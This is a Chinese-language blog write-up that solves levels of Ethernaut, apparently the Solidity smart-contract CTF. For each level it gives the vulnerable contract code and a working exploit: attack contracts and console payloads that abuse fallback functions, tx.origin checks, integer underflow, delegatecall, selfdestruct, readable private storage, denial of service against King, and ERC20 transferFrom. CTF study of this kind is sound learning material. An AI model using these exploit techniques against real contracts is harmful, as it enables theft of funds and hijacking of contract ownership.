---
title: Ethernaut WriteUp
tags: [solidiry, security]
description: 智能合约CTF
---

### 很好玩的合约游戏   

---

#### 1. Fallback  
> **Target**: claim ownership of the contract  

&emsp;&emsp;这道题是考察**fallback**函数的奇妙(sb)用法，他的目的应该是处理异常用的，但是效果其实有点鸡肋...

```javascript
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract Fallback is Ownable {

  mapping(address => uint) public contributions;

  function Fallback() public {
    contributions[msg.sender] = 1000 * (1 ether);
  }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(this.balance);
  }

  function() payable public {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```
&emsp;&emsp;在这里，我们只需要 **我 秦始皇 打钱** 就可以实现fallback()的调用：  

> contract.sendTransaction({value:1});  

&emsp;&emsp;智能合约的梗是真他喵的多 哈哈哈哈哈

---

#### 2. Fallout  

> **Target**: Claim ownership of the contract  

&emsp;&emsp;这道题的出题人是真的欠揍，马德，完全是考眼力：  

```javascript
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract Fallout is Ownable {

  mapping (address => uint) allocations;

  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  function allocate() public payable {
    allocations[msg.sender] += msg.value;
  }

  function sendAllocation(address allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(this.balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```
&emsp;&emsp;看到没有第9行正儿八经的写着**constructor** 喵？定睛一看构造个瓜皮的函数，**Fal1out()** 这里不要被骗了，直接调用就可以了。  

> contract.Fal1out();  

---

#### 3. Coin Flip  

---

#### 4. Telephone  

> **Target**: 将owner变为自己  

&emsp;&emsp;本题主要考察的是只能合约中tx.origin与msg.sender的区别，tx.origin是交易发起人，msg.sender是合约的上层调用地址。因此只需要用新合约包装一下地址就好了。

```javascript 
pragma solidity >=0.4.0 < 0.6.0;
contract Telephone {

    address public owner;

    function Telephone() public {
    owner = msg.sender;
  }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract attack{

    address target = 0x811cb74F2FC520c64f7B44ac90d056c744f0Cf4d;
    Telephone c = Telephone(target);
    
    function hit() public{
            Telephone c = Telephone(target);
            c.changeOwner(msg.sender);
      }
}
```

---

#### 5. Token  

> **Target**: 将owner变为自己  

&emsp;&emsp;这里主要考察uint的无符号整数的下溢,当uint为负数时，根据二进制的无符号表示法，此时数会变成一个极大的数，比如:  

```javascript
uint a = 1;

a = a - 2;           //此时a为ffffffff

```

&emsp;&emsp;这在pwn中十分常见，因此我们可以构造payload，即:  

> contract.transfer(yourAddress,21);

&emsp;&emsp;或者构造攻击合约：  
```javascript
pragma solidity ^0.4.18;

contract Token {

    mapping(address => uint) balances;
    uint public totalSupply;

    function Token(uint _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
    }
}

contract attack{
    address Tokens = 0x0c65c7ec30d5d856958707fc8b958302ae689b49;
    Token target = Token(Tokens);
    function hit() public {
        target.transfer(msg.sender,21);
    }

}
```
---

#### 6. Delegation  

> **Target**: 将owner变为自己  

&emsp;&emsp;这道题主要考察的是delegatecall()相关的知识，**delegatecall()** 与 **call()** 的区别是两者的上下文不同，delegatecall()的上下文是调用方，而call()函数的上下文则是实例本身。

![delegatecall()](https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/eth_writeUp0.png?raw=true)  

&emsp;&emsp;我们来看一下合约代码：

```javascript
pragma solidity ^0.4.18;

contract Delegate {

  address public owner;

  function Delegate(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  function Delegation(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  function() public {
    if(delegate.delegatecall(msg.data)) {
      this;
    }
  }
}
```

&emsp;&emsp;我们可以看到**Delegation**的**fallback**函数中存在**delegatecall**而且其中的参数可以修改，这个时候我们可以直接调用**Delegate**实例的**pwn()**函数，payload如下：  

> contract.sendTransaction({data:web3.sha3("pwn()")})  

&emsp;&emsp;这个时候我们可以看到实例直接调用了非**public**的**pwn**函数,我们就实现了修改owner的操作。

---

#### 7. Force  

&emsp;&emsp;这一题是要你给这个合约转钱，这里除了一只噬元兽什么也没有...乍一看挺懵逼的  

```javascript
pragma solidity ^0.4.18;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)         //马德 为什么这个猫变形了...

*/}
```
&emsp;&emsp;要想给一个地址强行转钱，我们可以让一个合约自杀，然后钱就会被强行转入别的账户而且不能拒绝。所以我们就可以写个合约，随便打点钱，然后让他当场暴毙...好生刺激。   

```javascript
pragma solidity ^0.4.18;

contract Force{

}

contract payload{
    function payload() payable{}
    address addr_force = 0x0ad6047bf65c599bf68fbbc0372c3923280f2a66;
    function hit() public {
        selfdestruct(addr_force);
    }
}
```
&emsp;&emsp;这样一来，一执行hit()函数payload就凉凉，然后钱就打到了Force里面了，有没有一种舔狗的感觉...  

---

#### 8. Vault  

> **Target**: 解锁  

&emsp;&emsp;这道题主要考察了如何通过**web3**的**web3.eth.getStorageAt()**接口来查看区块上的信息。 


```javascript  
pragma solidity ^0.4.18;

contract Vault {
  bool public locked;
  bytes32 private password;

  function Vault(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

&emsp;&emsp;我们只需要通过**unlock()**函数就能修改locked的值，getStorageAt()的用法如下：  

> web3.eth.getStorageAt(addressHexString, position [, defaultBlock] [, callback])  

&emsp;&emsp;我们需要使用一个回调函数来打印出相关数据：  

```javascript
web3.eth.getStorageAt(contract.address,1,function(x,y){
    var result = web3.toAscii(y);
    alert(result);
        });
```

---

#### 9. King  

> **Target**: Be a king forever!!  

&emsp;&emsp;先放源码：  

```javascript
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract King is Ownable {

  address public king;
  uint public prize;

  function King() public payable {
    king = msg.sender;
    prize = msg.value;
  }

  function() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
}
```

&emsp;&emsp;这个题目有点坑爹，他原本的目的是让你进行一次**ddos**攻击,在之前的版本中，我们可以使用  
```javascript
1. require()

2. revert()

3. assert()
```
&emsp;&emsp;这三个函数主动抛出错误，这样一样就可以阻止**transfer()**的进行，但是在实施的时候我们发现这三个函数并没有阻止交易的进行，所以我们决定直接放弃编写fallback()从而进行拒绝服务攻击。  

```javascript
contract fuck{
    function fuck() payable{
        address king_addr = 0xc48b3899a3a594b170404855De1B0bDA2d0aec1c;
        king_addr.call.value(1.01 ether)();
    }
    function gg() public{
        selfdestruct(msg.sender);
    }
}
```
> gg()完全是为了以防钱提不出来，留个后手。  

---

#### 15.Naught Coin  

> **Target**:取出合约中player所对应的balances  

&emsp;&emsp;这里的balances实际上是一个token，作者重写了transfer()方法，但是他的源码不见了，我在github上找到了之前的版本：  

```javascript
pragma solidity ^0.4.24;

import "./BasicToken.sol";
import "./ERC20.sol";


/**
 * @title Standard ERC20 token
 *
 * @dev Implementation of the basic standard token.
 * https://github.com/ethereum/EIPs/issues/20
 * Based on code by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol
 */
contract StandardToken is ERC20, BasicToken {

  mapping (address => mapping (address => uint256)) internal allowed;


  /**
   * @dev Transfer tokens from one address to another
   * @param _from address The address which you want to send tokens from
   * @param _to address The address which you want to transfer to
   * @param _value uint256 the amount of tokens to be transferred
   */
  function transferFrom(
    address _from,
    address _to,
    uint256 _value
  )
    public
    returns (bool)
  {
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    require(_to != address(0));

    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }

  /**
   * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.
   * Beware that changing an allowance with this method brings the risk that someone may use both the old
   * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this
   * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   * @param _spender The address which will spend the funds.
   * @param _value The amount of tokens to be spent.
   */
  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  /**
   * @dev Function to check the amount of tokens that an owner allowed to a spender.
   * @param _owner address The address which owns the funds.
   * @param _spender address The address which will spend the funds.
   * @return A uint256 specifying the amount of tokens still available for the spender.
   */
  function allowance(
    address _owner,
    address _spender
   )
    public
    view
    returns (uint256)
  {
    return allowed[_owner][_spender];
  }

  /**
   * @dev Increase the amount of tokens that an owner allowed to a spender.
   * approve should be called when allowed[_spender] == 0. To increment
   * allowed value is better to use this function to avoid 2 calls (and wait until
   * the first transaction is mined)
   * From MonolithDAO Token.sol
   * @param _spender The address which will spend the funds.
   * @param _addedValue The amount of tokens to increase the allowance by.
   */
  
}
```
&emsp;&emsp;这里我们可以看到transcationFrom()方法并没有被重写，因此我们可以直接调用，但是需要授权。

&emsp;&emsp;接下来看一下题目代码：  

```javascript
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/token/ERC20/StandardToken.sol';

 contract NaughtCoin is StandardToken {

  string public constant name = 'NaughtCoin';
  string public constant symbol = '0x0';
  uint public constant decimals = 18;
  uint public timeLock = now + 10 years;
  uint public INITIAL_SUPPLY = 1000000 * (10 ** decimals);
  address public player;

  function NaughtCoin(address _player) public {
    player = _player;
    totalSupply_ = INITIAL_SUPPLY;
    balances[player] = INITIAL_SUPPLY;
    Transfer(0x0, player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) lockTokens public returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  } 
} 
```
&emsp;&emsp;这里我们可以看到合约只重写了transfer()函数，这里的balances并不是Ether，而是一种token，因此我们只需要给自己授权，然后吧token转给一个账户就行了。  

> await contract.approve(player,1000000*(10*18))
> await contract.transferFrom(player,instance,1000000*(10**18));  

&emsp;&emsp;这样以来我们就吧token全部转出了。  

---  


